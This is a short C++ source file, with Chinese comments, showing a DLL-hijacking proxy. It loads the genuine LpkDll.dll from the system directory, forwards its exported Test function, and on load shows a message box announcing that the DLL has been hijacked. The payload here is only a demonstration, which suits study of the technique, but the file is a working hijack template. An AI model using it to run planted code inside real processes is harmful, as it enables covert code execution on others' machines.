// Lpkdll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include <Windows.h>

typedef void  (* FUNTEST)();
FUNTEST  g_funTest = NULL;

// extern "C"  __declspec(dllexport) void Test()
// {
// 	g_funTest();
// }
extern "C"  __declspec(naked) __declspec(dllexport) void Test()
{
	__asm jmp dword ptr [g_funTest]
}

BOOL APIENTRY DllMain( HMODULE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved)
{
	//进程加载时调用DLLMain时
	if(ul_reason_for_call == DLL_PROCESS_ATTACH)
	{	//禁用进程内线程创建或退出而调用DllMain入口函数
		DisableThreadLibraryCalls(hModule);
		//获取原始LpkDll.dll导出的函数地址并保存.
		char cDllPath[MAX_PATH]={0};
		GetSystemDirectoryA((LPSTR)cDllPath,MAX_PATH);
		strcat(cDllPath,"\\LpkDll.dll");
		HMODULE hDll = LoadLibraryA(cDllPath);
		g_funTest = (FUNTEST)GetProcAddress(hDll, "Test");
		MessageBox(NULL,"dll劫持了!","dll劫持了!",MB_OK);
	}
    return TRUE;
}

